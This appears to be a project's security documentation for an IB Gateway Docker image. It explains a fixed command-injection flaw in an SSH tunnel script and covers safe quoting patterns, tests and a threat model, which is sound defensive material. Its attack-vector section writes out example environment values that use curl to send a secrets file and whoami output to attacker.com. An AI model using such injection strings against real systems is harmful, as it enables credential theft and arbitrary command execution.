# Security Documentation

## Overview
This document outlines security patterns and considerations for the IB Gateway Docker project, with emphasis on preventing command injection vulnerabilities in SSH tunnel functionality.

## Critical Security Fix: Command Injection Prevention (CWE-78)

### Vulnerability Summary
**Fixed in commit ce2847e (2025-10-14)**

A critical command injection vulnerability existed in the SSH tunnel implementation where unquoted variable expansion in a `bash -c` wrapper allowed arbitrary command execution through environment variables.

**CVSS v3.1 Score**: 9.1 (Critical)  
**Classification**: CWE-78 - Improper Neutralization of Special Elements used in an OS Command  
**OWASP**: A03:2021 - Injection

### Attack Vector (Now Mitigated)
Before the fix, malicious input in environment variables could execute arbitrary commands:

```bash
# Example attack through SSH_USER_TUNNEL
SSH_USER_TUNNEL="user@host; curl http://attacker.com/exfil?data=$(cat /run/secrets/tws_password); #"

# Example attack through SSH_OPTIONS
SSH_OPTIONS="-o ProxyCommand='curl http://attacker.com/$(whoami)'"
```

These would have executed because `bash -c` performed secondary shell parsing on expanded variables.

### The Fix: Direct Execution Pattern

**Location**: stable/scripts/run_ssh.sh:20, latest/scripts/run_ssh.sh:20, image-files/scripts/run_ssh.sh:20

**Before (Vulnerable)**:
```bash
bash -c "ssh ${_OPTIONS} -TNR 127.0.0.1:${_LOCAL_PORT}:localhost:${_REMOTE_PORT} ${_SCREEN:-} ${_USER_TUNNEL}"
```

**After (Secure)**:
```bash
# shellcheck disable=SC2086  # Word splitting intentional for _OPTIONS and _SCREEN
ssh ${_OPTIONS} -TNR "127.0.0.1:${_LOCAL_PORT}:localhost:${_REMOTE_PORT}" ${_SCREEN:-} "${_USER_TUNNEL}"
```

**Key Changes**:
1. Removed `bash -c` wrapper (eliminates secondary shell parsing)
2. Quoted `_USER_TUNNEL` (prevents injection through user@host field)
3. Quoted port forwarding spec (prevents tunnel configuration manipulation)
4. Left `_OPTIONS` and `_SCREEN` unquoted (intentional word splitting for multiple SSH arguments)

### Why This Works

When bash executes the fixed command:
1. Variable expansion occurs in-place
2. Word splitting breaks `_OPTIONS` and `_SCREEN` into separate arguments
3. Bash calls `execve()` directly with the ssh binary and argument array
4. **No secondary shell parsing** - metacharacters become literal strings to ssh

Example with malicious input:
```bash
SSH_USER_TUNNEL="user@host; malicious-command"
# After expansion:
ssh ... "user@host; malicious-command"
# SSH receives: connection target = "user@host; malicious-command" (literal semicolon)
# SSH attempts connection to hostname "host; malicious-command" (fails with DNS error)
# The malicious command is NEVER executed
```

## Secure Shell Scripting Patterns

### Pattern 1: Never Use `bash -c` with User Input

**NEVER DO THIS**:
```bash
bash -c "command $USER_VARIABLE"
bash -c "command ${USER_VARIABLE}"
eval "command $USER_VARIABLE"
```

**ALWAYS DO THIS**:
```bash
command "$USER_VARIABLE"        # For single values
command ${MULTI_ARG_VARIABLE}   # When word splitting is needed (document with shellcheck directive)
```

### Pattern 2: Quote User-Controlled Strings

Variables containing user@host, paths, or any string that should be treated as a single argument:

```bash
ssh "${USER_TUNNEL}"                    # Correct
ssh -p "${PORT}" "${USER_HOST}"         # Correct
ssh ${UNQUOTED_USER_HOST}               # WRONG - injection risk
```

### Pattern 3: Intentional Word Splitting

When a variable contains multiple SSH options or arguments that MUST be split:

```bash
# At top of script or near usage
# shellcheck disable=SC2086  # Word splitting intentional for SSH options

# In code
ssh ${SSH_OPTIONS} -T "${HOST}"         # SSH_OPTIONS="-o Foo=bar -v" becomes two arguments
```

**Document the intent** with shellcheck directive and comment explaining why word splitting is required.

### Pattern 4: Secrets Handling

Use the `file_env` pattern for credentials:

```bash
file_env 'SSH_PASSPHRASE'               # Load from env or file
# ... use $SSH_PASSPHRASE ...
unset_env 'SSH_PASSPHRASE'              # Immediately unset after use
```

This pattern:
- Supports both direct env vars and `_FILE` variants (Docker secrets)
- Prevents secrets from remaining in environment
- Works with ssh-agent which consumes the passphrase

Reference implementation: stable/scripts/common.sh:45-71

### Pattern 5: Validate with Shellcheck

All shell scripts MUST pass shellcheck without errors:

```bash
shellcheck -x script.sh
```

Warnings may be suppressed ONLY when:
1. The pattern is intentional (e.g., SC2086 for word splitting)
2. A comment explains WHY the pattern is safe
3. The suppression is as narrow as possible (single line, not file-wide)

## Validation and Testing

### Security Test Suite

**Location**: tests/security_test_ssh_injection.sh

Tests verify:
1. Command injection via SSH_USER_TUNNEL (semicolon) - MUST NOT execute
2. Command injection via SSH_USER_TUNNEL (command substitution) - MUST NOT execute
3. Command injection via SSH_OPTIONS (semicolon) - MUST NOT execute
4. Command injection via SSH_OPTIONS (backticks) - MUST NOT execute
5. Command injection via SSH_SCREEN (semicolon) - MUST NOT execute
6. Legitimate multi-word SSH options - MUST work correctly

**Run tests**:
```bash
cd /home/pandashark/projects/ib-gateway-docker
./tests/security_test_ssh_injection.sh
```

Expected output: 6/6 tests PASS

### Continuous Integration

Pre-commit hooks and CI/CD should:
1. Run shellcheck on all .sh files
2. Execute security test suite
3. Fail the build on any security test failure

Reference: .pre-commit-config.yaml

## Environment Variable Risk Assessment

| Variable | Risk | Mitigation | Notes |
|----------|------|------------|-------|
| `SSH_USER_TUNNEL` | **HIGH** | Quoted in ssh command | Connection target - must prevent injection |
| `SSH_OPTIONS` | **HIGH** | Unquoted (intentional), validated by ssh | SSH validates option syntax |
| `SSH_SCREEN` | **MEDIUM** | Unquoted (intentional), derived from numeric port | Constructed from validated port numbers |
| `SSH_PASSPHRASE` | **NONE** | Never used in shell expansion | Only passed to ssh-add via sshpass |
| `SSH_REMOTE_PORT` | **LOW** | Used in quoted string | Numeric, validated by ssh |
| `SSH_VNC_PORT` | **LOW** | Used in quoted string | Numeric, validated by ssh |
| `SSH_RDP_PORT` | **LOW** | Used in quoted string | Numeric, validated by ssh |
| `SSH_ALIVE_INTERVAL` | **LOW** | Used in quoted string | Numeric, validated by ssh |
| `SSH_ALIVE_COUNT` | **LOW** | Used in quoted string | Numeric, validated by ssh |
| `SSH_RESTART` | **NONE** | Only used in sleep command | Numeric, minimal risk |

## Defense in Depth Measures

### 1. Principle of Least Privilege
- Container runs as non-root user (ibgateway, UID 1000)
- Config files have 600 permissions
- SSH keys require proper permissions (600)

### 2. Secrets Management
- Supports Docker secrets via `_FILE` environment variables
- Credentials never logged or persisted in environment
- Immediate unset after consumption

### 3. Input Validation
While the fix prevents injection, additional validation provides defense in depth:

```bash
# Example: Validate SSH_REMOTE_PORT is numeric
if ! [[ "$SSH_REMOTE_PORT" =~ ^[0-9]+$ ]]; then
    echo "Error: SSH_REMOTE_PORT must be numeric"
    exit 1
fi
```

Consider adding similar validation for user-facing variables in future enhancements.

### 4. Strict Error Handling
Added in commit (2025-10-14):
- All scripts use `set -Eeo pipefail` for fail-fast behavior
- **Critical**: common.sh:4 ensures configuration functions fail loudly
- Prevents silent failures that could expose credentials or misconfigure security settings
- Functions protected: apply_settings, set_ports, setup_ssh, set_java_heap, port_forwarding, start_ssh, start_socat

Without strict error handling, failures in configuration could result in:
- Credential files left world-readable (chmod failure)
- Wrong trading mode ports (silent set_ports failure)
- Disabled SSH tunnels (silent setup_ssh failure)
- Missing IBC configuration (silent apply_settings failure)

Reference: sessions/tasks/h-fix-missing-error-handling.md

### 5. Process Isolation
- SSH tunnels run in background processes
- Automatic restart on failure (contained loops)
- Process detection prevents duplicate instances

### 6. Audit and Logging
All security-relevant operations log to stdout:
- SSH tunnel startup with socket path
- ssh-agent initialization
- Key loading into agent
- Port forwarding activation

Monitor these logs for anomalies.

## Threat Model

### Insider Threat (Primary Risk)
**Actor**: Developer/operator with access to docker-compose.yml or .env files  
**Attack**: Set malicious environment variables before container start  
**Impact**: Could execute arbitrary code, exfiltrate secrets, compromise trading account  
**Mitigation**:
- This vulnerability is now fixed
- Code review for all docker-compose.yml changes
- Least privilege access to deployment files
- Audit logging of container starts

### Supply Chain Attack (Secondary Risk)
**Actor**: Compromised dependency or build pipeline  
**Attack**: Inject malicious default values into images  
**Impact**: Similar to insider threat  
**Mitigation**:
- Image signing and verification
- Dependency pinning
- CI/CD security scanning
- Shellcheck in build pipeline

### External Attacker (Tertiary Risk)
**Actor**: Network attacker without initial access  
**Attack**: Would require prior container/host compromise to modify environment  
**Impact**: Depends on level of prior compromise  
**Mitigation**:
- Secure Docker daemon
- Network segmentation
- Runtime security monitoring
- Regular security updates

## Secure Development Guidelines

### When Modifying Scripts

1. **Read this document first**
2. **Never introduce `bash -c`, `eval`, or `sh -c` with variables**
3. **Quote all user-controlled string variables**
4. **Document intentional word splitting with shellcheck directives**
5. **Run shellcheck on modified files**
6. **Run security test suite**
7. **Test with both stable and latest images**
8. **Apply changes to all three directories** (stable, latest, image-files)

### Code Review Checklist

For any PR touching shell scripts:

- [ ] No `bash -c`, `eval`, or `sh -c` with variables
- [ ] User-controlled strings are quoted
- [ ] Intentional word splitting is documented
- [ ] Shellcheck passes with 0 errors
- [ ] Security tests pass
- [ ] Changes applied to all version directories
- [ ] Inline security comments preserved

## Reporting Security Issues

Security vulnerabilities should be reported via GitHub Security Advisories:
https://github.com/gnzsnz/ib-gateway-docker/security/advisories

Do NOT open public issues for security vulnerabilities.

## References

- CWE-78: https://cwe.mitre.org/data/definitions/78.html
- OWASP Injection: https://owasp.org/www-project-top-ten/2017/A1_2021-Injection
- Bash Manual (Word Splitting): https://www.gnu.org/software/bash/manual/html_node/Word-Splitting.html
- Shellcheck: https://www.shellcheck.net/
- SSH Manual: https://manpages.ubuntu.com/manpages/noble/en/man1/ssh.1.html

## Version History

| Date | Version | Change |
|------|---------|--------|
| 2025-10-14 | 1.0 | Initial security documentation - CWE-78 fix (commit ce2847e) |
| 2025-10-14 | 1.1 | Added strict error handling to common.sh - prevents silent configuration failures |
